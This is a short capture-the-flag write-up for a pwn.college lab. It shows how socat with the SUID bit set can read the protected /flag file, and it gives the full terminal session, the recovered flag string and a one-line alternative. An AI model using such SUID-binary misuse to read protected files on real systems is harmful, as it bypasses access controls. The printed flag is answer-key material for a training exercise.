`socat`

`socat is a command line based utility that establishes two bidirectional byte streams and transfers data between them.`

It is advised to read the `man socat`.

`socat` is a versatile utility, and while it can used to read files. its primary strength lies in establishing data streams between different sources.

```bash
hacker@program-misuse-level-32:~$ cd /challenge/
hacker@program-misuse-level-32:/challenge$ ls
babysuid_level32
hacker@program-misuse-level-32:/challenge$ ./babysuid_level32 
Welcome to ./babysuid_level32!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/socat.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level32) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/socat!
hacker@program-misuse-level-32:/challenge$ cd /
hacker@program-misuse-level-32:/$ socat /flag
2024/01/03 04:59:52 socat[711] E exactly 2 addresses required (there are 1); use option "-h" for help
hacker@program-misuse-level-32:/$ socat /flag /home/hacker/
2024/01/03 05:00:22 socat[978] E open("/home/hacker/", 02002, 0666): Is a directory
hacker@program-misuse-level-32:/$ touch /home/hacker/flag
hacker@program-misuse-level-32:~$ ls -l /home/hacker/flag
-rw-r--r-- 1 hacker hacker 57 Jan  3 05:00 /home/hacker/flag
hacker@program-misuse-level-32:/$ socat /flag /home/hacker/flag
hacker@program-misuse-level-32:/$ cd
hacker@program-misuse-level-32:~$ ls
Desktop  demo  flag
hacker@program-misuse-level-32:~$ cat flag
pwn.college{AMIeLKMRylXdSLsLa9zGoFM6y9v.0FN3EDL0AjNzQzW}
hacker@program-misuse-level-32:~$ socat -u FILE:/flag STDOUT
pwn.college{AMIeLKMRylXdSLsLa9zGoFM6y9v.0FN3EDL0AjNzQzW}
```

Here in this problem, I first tried `socat /flag`. But it says `socat` requires 2 addresses and there is only 1 which is `/flag`. That means one address for reading and other address for writing.

So I tried `socat /flag /home/hacker` but it says `/home/hacker` is a directory. That means I should pass something other than `directory`. Let's take a file. I create a `flag` file with `touch /home/hacker/flag` in my `home` directory. And then I write `socat /flag /home/hacker/flag`
. As I have the read access to this `/home/hacker/flag` so I `cat` the flag and found the `flag`.

You can also use `socat -u FILE:/flag STDOUT` .

